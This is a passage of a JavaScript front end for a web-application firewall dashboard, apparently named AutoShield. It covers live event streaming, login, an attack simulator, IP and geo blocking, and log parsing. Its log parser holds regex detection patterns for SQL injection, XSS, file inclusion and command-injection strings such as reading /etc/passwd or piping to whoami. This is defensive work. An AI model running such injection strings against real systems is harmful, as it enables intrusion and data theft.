        connection = { online: true, mode: 'streaming', lastError: '' };
        const eventTs = new Date(ev?.timestamp || 0).getTime();
        const isHistoricalEvent = suppressHistoricNotifications
          ? (Number.isFinite(eventTs) ? eventTs < (streamStartedAt - 3000) : true)
          : false;
        const stage = normalizeEventStatus(ev.status);
        const existingIndex = log.findIndex((item) => item.id === ev.id);
        if (existingIndex >= 0) {
          const existing = log[existingIndex];
          log.splice(existingIndex, 1);
          log.unshift({ ...existing, ...ev });
        } else {
          log.unshift(ev);
        }
        if (log.length > 500) log.pop();
        if (ev.action === 'BLOCKED') blockedIPs.add(ev.src_ip);

        // Track for DDoS detection
        if (!isHistoricalEvent && ev.src_ip) trackRequest(ev.src_ip);

        // Auto-notification for blocked attacks
        if (!isHistoricalEvent && ev.action === 'BLOCKED' && (ev.severity === 'CRITICAL' || ev.severity === 'HIGH')) {
          addNotification('attack_blocked', `🚫 ${ev.attack_type} Blocked`, `${ev.src_ip} — ${ev.payload?.slice(0, 60) || 'Malicious payload detected'}`, ev.severity === 'CRITICAL' ? 'critical' : 'high');
        } else if (isHistoricalEvent && ev.action === 'BLOCKED' && (ev.severity === 'CRITICAL' || ev.severity === 'HIGH')) {
          queueHistoricalAlert('blocked', ev);
        }

        if (!isHistoricalEvent && stage === 'MITIGATING') {
          addNotification('system', '⚙️ Mitigation Running', `${ev.attack_type} from ${ev.src_ip} is being actively contained.`, 'medium');
        } else if (!isHistoricalEvent && stage === 'FIXED') {
          addNotification('system', '✅ Threat Fixed', `${ev.attack_type} from ${ev.src_ip} has been blocked and resolved.`, 'success');
        } else if (isHistoricalEvent && stage === 'MITIGATING') {
          queueHistoricalAlert('mitigating', ev);
        } else if (isHistoricalEvent && stage === 'FIXED') {
          queueHistoricalAlert('fixed', ev);
        }

        notify();

        if (syncTimer) clearTimeout(syncTimer);
        syncTimer = setTimeout(() => fetchState(), 2000);
      } catch (err) { }
    };

    const connectViaSSE = () => {
      eventSource = new EventSource(`${API_URL}/events/stream?token=${token}`);

      eventSource.onmessage = (e) => {
        try {
          const incoming = normalizeEvent(JSON.parse(e.data));
          handleIncomingEvent(incoming);
        } catch (_) { }
      };

      eventSource.onerror = () => {
        if (seq !== streamSeq) return;
        connection = { online: false, mode: 'reconnecting', lastError: 'Event stream dropped' };
        notify();

        eventSource.close();
        const delay = Math.min(30000, Math.pow(2, retryCount) * 1000 + (Math.random() * 1000));
        retryCount++;

        setTimeout(() => token && connectSSE(token), delay);
      };
    };

    try {
      const wsBase = API_URL.replace(/^http:/, 'ws:').replace(/^https:/, 'wss:');
      wsSocket = new WebSocket(`${wsBase}/ws/events?token=${encodeURIComponent(token)}`);
      let wsFallbackToSSE = false;
      let wsHasOpened = false;

      // ═══ 3-second timeout — Render free tier kills WS upgrades silently ═══
      const wsConnectTimeout = setTimeout(() => {
        if (!wsHasOpened && wsSocket && wsSocket.readyState !== WebSocket.OPEN) {
          console.warn('[AutoShield] WS connect timed out — falling back to SSE');
          wsFallbackToSSE = true;
          try { wsSocket.close(); } catch (_) { }
          wsSocket = null;
          connectViaSSE();
        }
      }, 3000);

      wsSocket.onopen = () => {
        if (seq !== streamSeq) return;
        wsHasOpened = true;
        clearTimeout(wsConnectTimeout);
        connection = { online: true, mode: 'websocket', lastError: '' };
        retryCount = 0;
        notify();
      };

      wsSocket.onmessage = (msg) => {
        try {
          const incoming = normalizeEvent(JSON.parse(msg.data));
          handleIncomingEvent(incoming);
        } catch (_) { }
      };

      wsSocket.onerror = () => {
        if (seq !== streamSeq) return;
        clearTimeout(wsConnectTimeout);
        if (wsHasOpened) return;
        wsFallbackToSSE = true;
        if (wsSocket) {
          try { wsSocket.close(); } catch (_) { }
          wsSocket = null;
        }
        connectViaSSE();
      };

      wsSocket.onclose = () => {
        if (seq !== streamSeq) return;
        clearTimeout(wsConnectTimeout);
        if (wsFallbackToSSE) return;
        if (wsSocket) {
          wsSocket = null;
        }
        const delay = Math.min(30000, Math.pow(2, retryCount) * 1000 + (Math.random() * 1000));
        retryCount++;
        connection = { online: false, mode: 'reconnecting', lastError: 'WebSocket closed' };
        notify();
        setTimeout(() => token && connectSSE(token), delay);
      };
    } catch (_) {
      connectViaSSE();
    }
    // Delay fetchState slightly so fetchAuthContext (running in parallel) can
    // return a 401 and clear the token before we fire off any data requests.
    setTimeout(() => { if (token) fetchState(); }, 600);
  };

  if (token) {
    setTimeout(() => connectSSE(token), 300);
  }

  const authenticate = async (username, password) => {
    try {
      const res = await requestWithTimeout(`${API_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      }, 10000);
      if (res.ok) {
        const data = await res.json();
        connectSSE(data.token);
        syncDomainsFromContext(data.context);
        applyUserTier(data?.context?.tier || data?.user?.tier || 'free', { silent: true });
        addNotification('system', '🔓 Logged In', 'Welcome back! Your session is active.', 'success');
        return {
          ...(data.user || {}),
          tier: data?.context?.tier || data?.user?.tier || 'free',
          authMethod: 'enterprise',
        };
      }
      const errorData = await res.json().catch(() => ({}));
      if (res.status === 401) throw new Error('Invalid username or password.');
      throw new Error(errorData?.detail || `Login failed (${res.status})`);
    } catch (err) {
      console.error('Login error:', err); // TEMP DEBUG
      if (err?.name === 'AbortError') {
        throw new Error(`API request timed out. Verify backend is reachable at ${API_URL}.`);
      }
      // TEMPORARILY DISABLED: Uncomment after confirming API_URL works
      // if (String(err?.message || '').includes('Failed to fetch')) {
      //   throw new Error('Cannot reach API server. Start backend on port 8503.');
      // }
      throw err;
    }
  };

  const signup = async (username, password) => {
    try {
      const res = await requestWithTimeout(`${API_URL}/auth/signup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      }, 10000);
      if (res.ok) {
        const data = await res.json();
        connectSSE(data.token);
        syncDomainsFromContext(data.context);
        applyUserTier(data?.context?.tier || data?.user?.tier || 'free', { silent: true });
        return {
          ...(data.user || {}),
          tier: data?.context?.tier || data?.user?.tier || 'free',
          authMethod: 'enterprise',
        };
      }
      const errorData = await res.json().catch(() => ({}));
      throw new Error(errorData?.detail || `Signup failed (${res.status})`);
    } catch (err) {
      console.error('Signup error:', err); // TEMP DEBUG
      if (err?.name === 'AbortError') {
        throw new Error(`API request timed out. Verify backend is reachable at ${API_URL}.`);
      }
      // TEMPORARILY DISABLED: Uncomment after confirming API_URL works
      // if (String(err?.message || '').includes('Failed to fetch')) {
      //   throw new Error('Cannot reach API server. Start backend on port 8503.');
      // }
      throw err;
    }
  };

  const fetchAuthContext = async () => {
    const activeToken = token || localStorage.getItem('as_token');
    if (!activeToken) return null;
    try {
      const res = await fetch(`${API_URL}/auth/me`, {
        headers: {
          'Content-Type': 'application/json',
          'X-AutoShield-Key': activeToken,
        }
      });
      if (res.status === 401 || res.status === 403) {
        console.warn('Auth context rejection. Clearing session.');
        // Kill active connections immediately so no timer re-fires with null token
        streamSeq += 1; // invalidates all in-flight SSE reconnect timers
        if (eventSource) { try { eventSource.close(); } catch (_) {} eventSource = null; }
        if (wsSocket) { try { wsSocket.close(); } catch (_) {} wsSocket = null; }
        localStorage.removeItem('as_token');
        localStorage.removeItem('as_user');
        localStorage.removeItem('as_tier');
        token = null;
        return null;
      }
      if (res.ok) {
        const data = await res.json();
        syncDomainsFromContext(data.context);
        applyUserTier(data?.context?.tier || data?.user?.tier || 'free', { silent: true });
        return {
          ...(data.user || {}),
          tier: data?.context?.tier || data?.user?.tier || 'free',
          authMethod: 'enterprise',
        };
      }
    } catch (_) { }
    return null;
  };

  const startAutoPilot = async () => {
    try {
      const res = await fetch(`${API_URL}/simulator/start`, { method: 'POST', headers: getHeaders() });
      // Always clear old timer before creating a new one to avoid duplicates
      if (localAutoPilotTimer) { clearInterval(localAutoPilotTimer); localAutoPilotTimer = null; }
      localAutoPilotTimer = setInterval(() => {
        const type = ATTACK_TYPES[Math.floor(Math.random() * ATTACK_TYPES.length)];
        simulateBurst(type);
      }, 2200);
      localAutoPilotActive = true;
      autoPilotActive = true;
      addNotification('system', '🤖 AutoPilot Engaged', 'Autonomous threat detection and response is now active.', 'success');
      if (!res.ok) throw new Error('Remote simulator unavailable');
      notify();
    } catch (e) { }
  };

  const stopAutoPilot = async () => {
    try {
      await fetch(`${API_URL}/simulator/stop`, { method: 'POST', headers: getHeaders() });
      if (localAutoPilotTimer) {
        clearInterval(localAutoPilotTimer);
        localAutoPilotTimer = null;
      }
      localAutoPilotActive = false;
      autoPilotActive = false;
      addNotification('system', '⏸️ AutoPilot Halted', 'Manual control restored. Monitoring continues passively.', 'info');
      notify();
    } catch (e) { }
  };

  const simulateBurst = async (type, siteId = null) => {
    try {
      const ip = IP_POOL[Math.floor(Math.random() * IP_POOL.length)];
      const payload = PAYLOADS[type][Math.floor(Math.random() * PAYLOADS[type].length)];

      // Track locally for DDoS detection
      trackRequest(ip);

      await fetch(`${API_URL}/events`, {
        method: 'POST',
        headers: getHeaders(),
        body: JSON.stringify({
          src_ip: ip,
          payload: payload,
          ingestion_source: "simulator_burst",
          site_id: siteId || undefined
        })
      });
      fetchState(siteId);
    } catch (e) { }
  };

  // Simulate DDoS attack for testing
  const simulateDDoS = (targetIP = null) => {
    const ip = targetIP || IP_POOL[Math.floor(Math.random() * IP_POOL.length)];
    addNotification('system', '💥 DDoS Simulation Started', `Flooding from ${ip} — testing detection threshold...`, 'info');
    let count = 0;
    const ddosInterval = setInterval(() => {
      if (count >= 60) {
        clearInterval(ddosInterval);
        addNotification('system', '✅ DDoS Simulation Complete', `Sent ${count} bursts. Check DDoS Shield for results.`, 'success');
        return;
      }
      trackRequest(ip);
      simulateBurst(ATTACK_TYPES[Math.floor(Math.random() * ATTACK_TYPES.length)]);
      count++;
    }, 150);
    return () => clearInterval(ddosInterval);
  };

  const parseAndInjectLogs = (text) => {
    const lines = String(text || '').split(/\r?\n/).filter(Boolean);
    if (!lines.length) return 0;

    const injected = [];
    const parseLimit = Math.min(lines.length, 1000);

    const detectAttack = (payload) => {
      const p = String(payload || '').toLowerCase();
      if (/(union\s+select|\bor\s+1=1\b|drop\s+table|sleep\()/i.test(p)) return { attack_type: 'SQLi', severity: 'CRITICAL' };
      if (/(<script|onerror=|onload=|javascript:)/i.test(p)) return { attack_type: 'XSS', severity: 'HIGH' };
      if (/(\.\.\/\.\.\/|\/etc\/passwd|php:\/\/filter|proc\/self\/environ)/i.test(p)) return { attack_type: 'LFI', severity: 'CRITICAL' };
      if (/(;\s*cat\s+\/etc\/passwd|\|\s*whoami|\$\(|`id`)/i.test(p)) return { attack_type: 'CMDi', severity: 'CRITICAL' };
      return { attack_type: 'Benign', severity: 'INFO' };
    };

    for (let i = 0; i < parseLimit; i++) {
      const line = lines[i];
      const m = line.match(/^(\d{1,3}(?:\.\d{1,3}){3}).*?"(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+([^\s"]+)/i);
      if (!m) continue;
      const src_ip = m[1];
      const method = m[2].toUpperCase();
      const path = m[3];
      const payload = `${method} ${path}`;
      const detected = detectAttack(payload);
      const geo = getGeoForIP(src_ip);
      const blocked = detected.severity === 'CRITICAL' || detected.severity === 'HIGH';

      injected.push(normalizeEvent({
        id: Date.now() + i,
        timestamp: new Date(Date.now() - (parseLimit - i) * 500).toISOString(),
        src_ip,
        payload,
        attack_type: detected.attack_type,
        severity: detected.severity,
        action: blocked ? 'BLOCKED' : 'MONITORED',
        status: blocked ? 'MITIGATED' : 'DETECTED',
        city: geo.city,
        country: geo.country,
        lat: geo.lat,
        lng: geo.lng,
        ingestion_source: 'forensic_upload',
      }));
    }

    if (!injected.length) return 0;

    log = [...injected.reverse(), ...log].slice(0, 500);
    blockedIPs = new Set([...blockedIPs, ...injected.filter((ev) => ev.action === 'BLOCKED').map((ev) => ev.src_ip)]);

    const byType = {};
    let blocked = 0;
    log.forEach((ev) => {
      byType[ev.attack_type] = (byType[ev.attack_type] || 0) + 1;
      if (ev.action === 'BLOCKED') blocked += 1;
    });
    const visitors = new Set(log.map((ev) => ev.src_ip).filter(Boolean)).size;
    const total = log.length;

    stats = {
      ...stats,
      total,
      blocked,
      visitors,
      blockRate: Math.round((blocked / Math.max(total, 1)) * 100),
      byType,
      byCountry: deriveCountryStats(log),
    };

    addNotification('system', '📂 Forensic Log Parsed', `Ingested ${injected.length} events from uploaded log.`, 'success');
    notify();
    return injected.length;
  };

  return {
    subscribe, simulateBurst, simulateDDoS,
    getLog: () => [...log],
    getRecentLog: (n = 20) => log.slice(0, n),
    getBlockedIPs: () => Array.from(blockedIPs),
    blockIP: async (ip, reason = 'Manual') => {
      blockedIPs.add(ip);
      addNotification('ip_blocked', '🚫 IP Blocked', `${ip} — ${reason}`, 'high');
      await fetch(`${API_URL}/block`, { method: 'POST', headers: getHeaders(), body: JSON.stringify({ ip, reason }) }).catch(() => { });
      notify();
      fetchState();
    },
    unblockIP: async (ip) => {
      blockedIPs.delete(ip);
      addNotification('system', '✅ IP Unblocked', `${ip} removed from blocklist`, 'info');
      await fetch(`${API_URL}/block/${ip}`, { method: 'DELETE', headers: getHeaders() }).catch(() => { });
      notify();
      fetchState();
    },
    isAutoPilotActive: () => autoPilotActive,
    startAutoPilot, stopAutoPilot,
    getStateVersion: () => stateVersion,
    getStats: () => stats,
    getThreatScore: () => stats.threatScore || 0,
    getBackendHealth: () => backendHealth,
    getCVE: (type) => CVE_DB[type] || CVE_DB.SQLi,
    getConnection: () => connection,
    getDomains: () => domains,
    addDomain: async (domain, upstreamUrl = null) => {
      const normalized = normalizeDomainInput(domain);
      if (!normalized) return domains;

      const maxSites = userTier === 'premium' ? 999 : 3;
      if (domains.length >= maxSites && userTier !== 'premium') {
        addNotification('system', '⚠️ Site Limit Reached', `Free tier allows ${maxSites} sites. Upgrade for unlimited.`, 'medium');
        return domains;
      }

      const exists = domains.some((d) => normalizeDomainInput(d.domain) === normalized);
      if (exists) return domains;

      const upstream = upstreamUrl || `http://${normalized}`;
      try {
        const res = await fetch(`${API_URL}/api/websites`, {
          method: 'POST',
          headers: getHeaders(),
          body: JSON.stringify({
            name: normalized,
            domain: normalized,
            plan: userTier === 'premium' ? 'premium' : 'free',
            upstream_url: upstream,
          }),
        });

        if (res.ok) {
          const siteData = await res.json();
          const newEntry = {
            domain: normalized,
            id: siteData.site_id || siteData.id,
            key: siteData.api_key || '',
            plan: userTier === 'premium' ? 'Premium' : 'Free',
            created: new Date().toISOString(),
            name: normalized,
            upstream_url: upstream,
          };
          domains = [...domains, newEntry];
          localStorage.setItem('as_domains', JSON.stringify(domains));
          addNotification('system', '🌐 Site Registered & Protected', `${normalized} → ${upstream} is now protected by AutoShield.`, 'success');
          notify();
          return domains;
        }

        if (res.status === 403) {
          const err = await res.json().catch(() => ({}));
          addNotification('system', '⚠️ Limit Reached', err.detail || 'Plan limit reached.', 'medium');
          return domains;
        }

        throw new Error(`Backend returned ${res.status}`);
      } catch (err) {
        const localEntry = {
          domain: normalized,
          id: `local_${Math.random().toString(36).slice(2, 10)}`,
          key: `as_local_${Math.random().toString(36).slice(2, 18)}`,
          plan: userTier === 'premium' ? 'Premium' : 'Free',
          created: new Date().toISOString(),
          name: normalized,
          isLocal: true,
        };
        domains = [...domains, localEntry];
        localStorage.setItem('as_domains', JSON.stringify(domains));
        addNotification('system', '🌐 Site Added (Local Only)', `${normalized} added locally. Log in again to sync with backend.`, 'info');
        notify();
        return domains;
      }
    },
    getCERTAdvisories: () => CERTIN_ADVISORIES,
    removeDomain: async (index) => {
      if (index < 0 || index >= domains.length) return domains;
      const removed = domains[index];
      let removedLocallyOnly = false;

      // For backend sites, delete first
      if (removed.id && !removed.isLocal) {
        try {
          const res = await fetch(`${API_URL}/api/websites/${removed.id}`, {
            method: 'DELETE',
            headers: getHeaders(),
          });
          const data = await res.json().catch(() => ({}));
          console.log('DELETE RESPONSE:', data);

          if (res.ok && data?.context) {
            syncDomainsFromContext(data.context);
          }

          if (!res.ok) {
            const detailRaw = data?.detail;
            const detail = typeof detailRaw === 'string'
              ? detailRaw
              : (detailRaw?.error || data?.error || data?.message || '').trim();

            if (res.status === 404) {
              removedLocallyOnly = true;
              addNotification(
                'system',
                '⚠️ Backend Link Missing',
                detail || 'Website was already missing in backend. Removed from local dashboard.',
                'medium'
              );
            } else {
              addNotification(
                'system',
                '❌ Delete Failed',
                detail || `Backend rejected delete request (${res.status}).`,
                'high'
              );
              return domains; // keep in UI for retrial
            }
          }
        } catch (err) {
          removedLocallyOnly = true;
          addNotification(
            'system',
            '⚠️ Backend Offline',
            'Removed locally. It may reappear after sync if backend deletion did not complete.',
            'medium'
          );
        }
      }

      // Now update local
      domains = domains.filter((_, i) => i !== index);
      localStorage.setItem('as_domains', JSON.stringify(domains));
      addNotification(
        'system',
        '🗑️ Site Removed',
        removedLocallyOnly
          ? `${removed.domain} removed from local dashboard.`
          : `${removed.domain} removed from your account.`,
        'info'
      );
      notify();
      return domains;
    },
    lookupCVE: (query) => {
      if (!query) return null;
      const q = query.trim().toUpperCase();
      if (CVE_DB[q]) return CVE_DB[q];
      const fallback = Object.values(CVE_DB).find(c => c.cve_id.includes(q) || c.desc.toUpperCase().includes(q));
      if (fallback) return fallback;

      const advisory = CERTIN_ADVISORIES.find((a) => {
        const haystack = `${a.id} ${a.title} ${a.desc}`.toUpperCase();
        return haystack.includes(q);
      });

      if (!advisory) return null;

      const advisoryCvss =
        advisory.severity === 'CRITICAL' ? 9.8 :
          advisory.severity === 'HIGH' ? 8.1 :
            advisory.severity === 'MEDIUM' ? 6.4 : 4.0;

      return {
        cve_id: advisory.id,
        cvss: advisoryCvss,
        severity: advisory.severity,
        published: 'CERT-IN',
        desc: advisory.desc,
        title: advisory.title,
        source: 'advisory',
      };
    },
    authenticate, signup, fetchAuthContext, parseAndInjectLogs,
    connectSSE, fetchState, getHeaders,
    getSimulatorStatus: () => simulatorStatus,

    // ═══ PREMIUM TIER API ═══
    getUserTier: () => userTier,
    isPremium: () => userTier === 'premium',
    setUserTier: applyUserTier,
    getFeatureGate: (feature) => {
      return featureGateForTier(userTier, feature, PREMIUM_FEATURES);
    },
    getPremiumFeatures: () => PREMIUM_FEATURES,

    // ═══ DDoS API ═══ (local + real backend calls for premium)
    getDDoSState: () => ({ ...ddosState }),
    resetDDoS: () => {
      ddosState = { active: false, mitigatedCount: 0, topAttackers: [], detectedAt: null, requestsPerSecond: 0, peakRPS: ddosState.peakRPS };
      Object.keys(ipRequestWindow).forEach(k => delete ipRequestWindow[k]);
      notify();
    },
    // Real backend DDoS engage - also activates local detection
    engageDDoSShield: async () => {
      try {
        const res = await fetch(`${API_URL}/ddos/engage`, { method: 'POST', headers: getHeaders() });
        if (res.ok) {
          const data = await res.json();
          ddosState.active = true;
          ddosState.detectedAt = new Date().toISOString();
          addNotification('ddos_detected', '🛡️ DDoS Shield ENGAGED', 'Aggressive rate limiting active. All repeat offenders will be auto-blocked.', 'critical');
          notify();
          return data;
        } else {
          const err = await res.json().catch(() => ({}));
          throw new Error(err.detail || `DDoS engage failed (${res.status})`);
        }
      } catch (err) {
        addNotification('system', '⚠️ DDoS Engage Failed', err.message, 'medium');
        throw err;
      }
    },
    // Real backend DDoS disengage
    disengageDDoSShield: async () => {
      try {
        const res = await fetch(`${API_URL}/ddos/disengage`, { method: 'POST', headers: getHeaders() });
        if (res.ok) {
          const data = await res.json();
          ddosState.active = false;
          addNotification('system', '✅ DDoS Shield Disengaged', 'Normal threat detection resumed.', 'success');
          notify();
          return data;
        }
      } catch (err) {
        addNotification('system', '⚠️ DDoS Disengage Failed', err.message, 'medium');
      }
    },
    // Live DDoS status from backend  
    fetchDDoSStatus: async () => {
      try {
        const res = await fetch(`${API_URL}/ddos/status`, { headers: getHeaders() });
        if (res.ok) {
          const data = await res.json();
          if (data.engaged !== undefined) ddosState.active = data.engaged;
          ddosState.topAttackers = (data.top_attackers || []).map(a => ({
            ip: a.ip,
            count: a.req_per_10s,
            reqPerSec: a.req_per_s,
            blocked: a.blocked,
            geo: getGeoForIP(a.ip),
          }));
          ddosState.mitigatedCount = data.total_dropped || ddosState.mitigatedCount;
          notify();
          return data;
        }
      } catch (_) { }
    },

    // ═══ WEBHOOKS API ═══
    getWebhooks: async (siteId) => {
      try {
        const res = await fetch(`${API_URL}/webhooks`, { headers: getHeaders() });
        if (res.ok) {
          const data = await res.json();
          return data.webhooks || [];
        }
      } catch (err) { console.error('Failed to fetch webhooks:', err); }
      return [];
    },
    registerWebhook: async (siteId, data) => {
      if (userTier !== 'premium') return { success: false, error: 'Premium required' };
      try {
        const res = await fetch(`${API_URL}/webhooks`, {
          method: 'POST',
          headers: getHeaders(),
          body: JSON.stringify(data)
        });
        if (res.ok) {
          addNotification('system', '🔗 Webhook Registered', `Connected to ${data.name || 'External SIEM'}`, 'success');
          return { success: true };
        }
        return { success: false, error: 'Registration failed' };
      } catch (err) { return { success: false, error: String(err) }; }
    },

    // ═══ SITE CONFIG & REPORTS ═══
    updateSiteConfig: async (siteId, config) => {
      if (userTier !== 'premium' && (config.blocked_countries || config.rate_limit_window)) {
        addNotification('system', '🔒 Premium Feature', 'Site customization requires Enterprise tier.', 'medium');
        return false;
      }
      try {
        const res = await fetch(`${API_URL}/api/websites/${siteId}/config`, {
          method: 'POST',
          headers: getHeaders(),
          body: JSON.stringify({ config })
        });
        if (res.ok) {
          addNotification('system', '⚙️ Policy Updated', 'Site security parameters synchronized.', 'success');
          return true;
        }
      } catch (err) { console.error('Site config update failed:', err); }
      return false;
    },
    downloadReport: async (siteId) => {
      try {
        addNotification('system', '📊 Generating Report', 'Compiling incident data and CVE matches...', 'info');
        const res = await fetch(`${API_URL}/reports/generate?site_id=${siteId}`, { headers: getHeaders() });
        if (!res.ok) throw new Error('Report generation failed');
        const blob = await res.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `AutoShield_Report_${siteId}.pdf`;
        document.body.appendChild(a);
        a.click();
        a.remove();
        addNotification('system', '✅ Report Ready', 'Security incident report downloaded.', 'success');
      } catch (err) {
        addNotification('system', '❌ Report Failed', String(err), 'high');
      }
    },
    fetchActivity: async (limit = 50, offset = 0, actionType = null, startDate = null) => {
      try {
        const params = new URLSearchParams({ limit, offset });
        if (actionType) params.append('action_type', actionType);
        if (startDate) params.append('start_date', startDate);
        const res = await fetch(`${API_URL}/api/activity?${params}`, { headers: getHeaders() });
        if (res.ok) {
          return await res.json();
        }
        throw new Error(`Failed to fetch activity: ${res.status}`);
      } catch (err) {
        console.error('Fetch activity error:', err);
        return { activities: [], total: 0 };
      }
    },
    downloadActivity: async (format = 'json') => {
      try {
        const data = await engine.fetchActivity(1000, 0); // Fetch more for export
        const activities = data.activities;
        if (format === 'csv') {
          const csv = 'Timestamp,Action Type,Description,Metadata\n' +
            activities.map(a => `"${a.timestamp}","${a.action_type}","${a.description.replace(/"/g, '""')}","${JSON.stringify(a.metadata).replace(/"/g, '""')}"`).join('\n');
          const blob = new Blob([csv], { type: 'text/csv' });
          const url = window.URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url;
          a.download = 'activity.csv';
          a.click();
          window.URL.revokeObjectURL(url);
        } else {
          const json = JSON.stringify(activities, null, 2);
          const blob = new Blob([json], { type: 'application/json' });
          const url = window.URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url;
          a.download = 'activity.json';
          a.click();
          window.URL.revokeObjectURL(url);
        }
        addNotification('system', '📥 Export Complete', `Activity data exported as ${format.toUpperCase()}.`, 'success');
      } catch (err) {
        addNotification('system', '❌ Export Failed', String(err), 'high');
      }
    },

    // ═══ RATE LIMITER API ═══
    getRateLimitConfig: () => ({ ...rateLimitConfig }),
    setRateLimit: (config) => {
      if (userTier !== 'premium') return false;
      Object.assign(rateLimitConfig, config);
      addNotification('system', '⚙️ Rate Limit Updated', `Window: ${rateLimitConfig.windowMs / 1000}s, Max: ${rateLimitConfig.maxRequests} req`, 'info');
      notify();
      return true;
    },
    getRateLimitedIPs: () => Array.from(rateLimitedIPs),
    getSiteHealth: (siteId, domain = '') => {
      const key = getSiteHealthKey(siteId, domain);
      return siteHealth.get(key) || {
        reachable: false,
        status_code: null,
        latency_ms: null,
        error: '',
        checked_at: null,
        status: 'UNKNOWN',
      };
    },
    refreshSiteHealth,
    getMasterIngestionKey: (user = null) => {
      if (user?.site_id) {
        const byUserSite = domains.find((d) => d.id === user.site_id);
        if (byUserSite?.key) return byUserSite.key;
      }
      if (domains[0]?.key) return domains[0].key;
      const fallbackToken = token || localStorage.getItem('as_token');
      if (fallbackToken && fallbackToken.startsWith('as_')) return fallbackToken;
      return 'NO_ACTIVE_KEY';
    },
    getSessionKey: () => token || localStorage.getItem('as_token') || '',

    // ═══ NOTIFICATION API ═══
    getNotifications: () => [...notifications],
    getUnreadCount: () => notifications.filter(n => !n.read).length,
    markNotifRead: (id) => {
      const n = notifications.find(n => n.id === id);
      if (n) { n.read = true; notify(); }
    },
    markAllRead: () => {
      notifications.forEach(n => { n.read = true; });
      notify();
    },
    clearNotifications: () => { notifications = []; notify(); },
    addNotification,

    // ═══ GEO-BLOCKING API ═══
    getBlockedCountries: () => Array.from(blockedCountries),
    blockCountry: (country) => {
      if (userTier !== 'premium') {
        addNotification('system', '🔒 Premium Feature', 'Geographic blocking requires Premium tier.', 'medium');
        return false;
      }
      blockedCountries.add(country);
      localStorage.setItem('as_blocked_countries', JSON.stringify([...blockedCountries]));
      addNotification('ip_blocked', '🌍 Country Blocked', `All traffic from ${country} will be blocked`, 'high');
      notify();
      return true;
    },
    unblockCountry: (country) => {
      blockedCountries.delete(country);
      localStorage.setItem('as_blocked_countries', JSON.stringify([...blockedCountries]));
      addNotification('system', '✅ Country Unblocked', `${country} removed from geo-block list`, 'info');
      notify();
    },

    // ═══ WHITELIST API ═══
    getWhitelistedIPs: () => Array.from(whitelistedIPs),
    whitelistIP: (ip) => {
      whitelistedIPs.add(ip);
      blockedIPs.delete(ip);
      rateLimitedIPs.delete(ip);
      localStorage.setItem('as_whitelist', JSON.stringify([...whitelistedIPs]));
      addNotification('system', '✅ IP Whitelisted', `${ip} added to whitelist — exempt from all blocking`, 'success');
      notify();
    },
    removeWhitelist: (ip) => {
      whitelistedIPs.delete(ip);
      localStorage.setItem('as_whitelist', JSON.stringify([...whitelistedIPs]));
      notify();
    },

    logout: () => {
      streamSeq += 1;
      localStorage.removeItem('as_token');
      localStorage.removeItem('as_user');
      localStorage.removeItem('as_tier');
      localStorage.removeItem('as_domains');
      token = null;
      userTier = 'free';
      rateLimitConfig.maxRequests = 60;
      if (typeof window !== 'undefined') window.location.reload();
      if (eventSource) eventSource.close();
      if (wsSocket) {
        try { wsSocket.close(); } catch (_) { }
        wsSocket = null;
      }
      if (localAutoPilotTimer) {
        clearInterval(localAutoPilotTimer);
        localAutoPilotTimer = null;
      }
      localAutoPilotActive = false;
      autoPilotActive = false;
      notify();
    }
  };
})();

const DASH_TABS = ['⚡ Command Center', '🌍 Website Monitoring', '🧱 Firewall Panel', '⏪ Attack Replay', '🔍 Threat Intel', '🌐 Global Map', '📊 Analytics', '📋 Reports', '🛡️ Website Protection', '🔰 DDoS Shield'];
const SEV_COLORS = { CRITICAL: 'var(--red)', HIGH: 'var(--orange)', MEDIUM: 'var(--cyan)', LOW: 'var(--green)', INFO: '#4A6080' };
const TYPE_COLORS = { SQLi: 'var(--red)', XSS: 'var(--yellow)', LFI: 'var(--purple)', CMDi: 'var(--orange)', Benign: '#4A6080' };
const TYPE_HEX_COLORS = { SQLi: '#ff4d4d', XSS: '#ffc857', LFI: '#7b6dff', CMDi: '#ff8b5b' };
const STATUS_COLORS = { DETECTED: 'var(--yellow)', MITIGATING: 'var(--orange)', FIXED: 'var(--green)', MITIGATED: 'var(--green)' };
const GEO_PALETTE = ['var(--red)', 'var(--orange)', 'var(--yellow)', 'var(--cyan)', 'var(--purple)', 'var(--green)'];
const PARTICLE_COLORS = ['rgba(0,200,255,.3)', 'rgba(106,92,255,.25)', 'rgba(0,255,156,.2)'];
const PARTICLE_DOTS = Array.from({ length: 30 }, (_, i) => ({
  id: i,
  size: 1.5 + ((i * 7) % 6) * 0.35,
  left: (i * 13.7) % 100,
  dur: 12 + ((i * 11) % 17),
  delay: ((i * 5) % 15) * 0.7,
  color: PARTICLE_COLORS[i % PARTICLE_COLORS.length],
}));

const AuthContext = createContext(null);
const MotionP = motion.p;
const MotionDiv = motion.div;
const MotionSection = motion.section;
const MotionH1 = motion.h1;

const AnimatedNumber = ({ value }) => {
  const springValue = useSpring(value, { stiffness: 60, damping: 20 });
  const [displayValue, setDisplayValue] = useState(value);

  useEffect(() => {
    springValue.set(value);
  }, [value, springValue]);

  useEffect(() => {
    return springValue.on("change", (v) => setDisplayValue(Math.round(v)));
  }, [springValue]);

  return <span>{displayValue.toLocaleString()}</span>;
};

const ThreatPulseOrb = ({ score }) => {
  const glowColor = score >= 70 ? '#ef4444' : score >= 40 ? '#eab308' : '#22c55e';
  const size = 60;

  return (
    <div style={{ position: 'relative', width: size, height: size, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
      <motion.div
        animate={{ scale: [1, 1.25, 1], opacity: [0.3, 0.6, 0.3] }}
        transition={{ duration: 2, repeat: Infinity, ease: "easeInOut" }}
        style={{ position: 'absolute', width: '100%', height: '100%', borderRadius: '50%', background: glowColor, filter: 'blur(12px)' }}
      />
      <div style={{ position: 'relative', width: size * 0.4, height: size * 0.4, borderRadius: '50%', background: 'white', boxShadow: `0 0 20px ${glowColor}` }} />
    </div>
  );
};

function normalizeEventStatus(status) {
  const raw = String(status || '').toUpperCase();
  if (!raw) return 'DETECTED';
  if (raw === 'MITIGATED') return 'FIXED';
  return raw;
}

function isEventFixed(ev) {
